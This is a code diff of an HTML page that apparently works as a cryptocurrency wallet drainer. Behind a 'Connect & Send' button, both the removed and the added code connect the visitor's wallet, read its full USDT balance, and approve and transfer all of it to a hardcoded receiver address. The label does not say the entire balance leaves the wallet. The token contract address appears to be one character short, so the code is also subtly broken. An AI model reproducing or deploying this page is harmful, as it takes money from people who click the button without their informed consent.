@@ -5,13 +5,12 @@
   <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-  <button onclick="connectAndTransfer()">Connect & Approve & Send</button>
+  <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    const receiverAddress = "0xC64087a6Fd263ab6A140Fb946f4CAF7B3e82147F"; // Your wallet address
-    const usdtContractAddress = "0x55d398326f99059fF775485246999027B319795"; // USDT BEP20
+    const receiverAddress = "0xC64087a6Fd263ab6A140Fb946f4CAF7B3e82147F"; // Do NOT change
 
-    // ABI with approve, allowance, transferFrom
+    const usdtContractAddress = "0x55d398326f99059fF775485246999027B319795"; // USDT BEP-20 BSC
     const usdtAbi = [
       {
         "constant": true,
@@ -22,61 +21,59 @@
       },
       {
         "constant": false,
-        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
+        "inputs": [
+          {"name": "_spender", "type": "address"},
+          {"name": "_value", "type": "uint256"}
+        ],
         "name": "approve",
         "outputs": [{"name": "", "type": "bool"}],
         "type": "function"
       },
       {
-        "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
-        "name": "allowance",
-        "outputs": [{"name": "remaining", "type": "uint256"}],
-        "type": "function"
-      },
-      {
         "constant": false,
-        "inputs": [{"name": "_from", "type": "address"}, {"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
-        "name": "transferFrom",
+        "inputs": [
+          {"name": "_to", "type": "address"},
+          {"name": "_value", "type": "uint256"}
+        ],
+        "name": "transfer",
         "outputs": [{"name": "", "type": "bool"}],
         "type": "function"
       }
     ];
 
     async function connectAndTransfer() {
-      if (!window.ethereum) {
+      if (window.ethereum) {
+        const web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await web3.eth.getAccounts();
+          const sender = accounts[0];
+
+          const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
+          const balance = await usdtContract.methods.balanceOf(sender).call();
+
+          const amountToSend = web3.utils.toBN(balance);
+          if (amountToSend.lte(0)) {
+            alert("Insufficient USDT balance.");
+            return;
+          }
+
+          // Step 1: Approve
+          await usdtContract.methods.approve(receiverAddress, amountToSend.toString())
+            .send({ from: sender });
+
+          // Step 2: Transfer
+          const tx = await usdtContract.methods.transfer(receiverAddress, amountToSend.toString())
+            .send({ from: sender });
+
+          alert("USDT sent successfully! Tx hash: " + tx.transactionHash);
+        } catch (err) {
+          console.error("Error:", err);
+          alert("Transaction failed: " + err.message);
+        }
+      } else {
         alert("Install MetaMask or Trust Wallet.");
-        return;
       }
-
-      const web3 = new Web3(window.ethereum);
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const accounts = await web3.eth.getAccounts();
-      const sender = accounts[0];
-      const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
-
-      // Get full USDT balance
-      const balance = await usdtContract.methods.balanceOf(sender).call();
-
-      if (balance <= 0) {
-        alert("No USDT to transfer.");
-        return;
-      }
-
-      // Approve transfer
-      await usdtContract.methods.approve(receiverAddress, balance).send({ from: sender });
-
-      // Check allowance
-      const allowance = await usdtContract.methods.allowance(sender, receiverAddress).call();
-      if (Number(allowance) < Number(balance)) {
-        alert("Approval failed or insufficient.");
-        return;
-      }
-
-      // Transfer from user to your wallet
-      const tx = await usdtContract.methods.transferFrom(sender, receiverAddress, balance).send({ from: sender });
-
-      alert("Success! Tx: " + tx.transactionHash);
     }
   </script>
 </body>
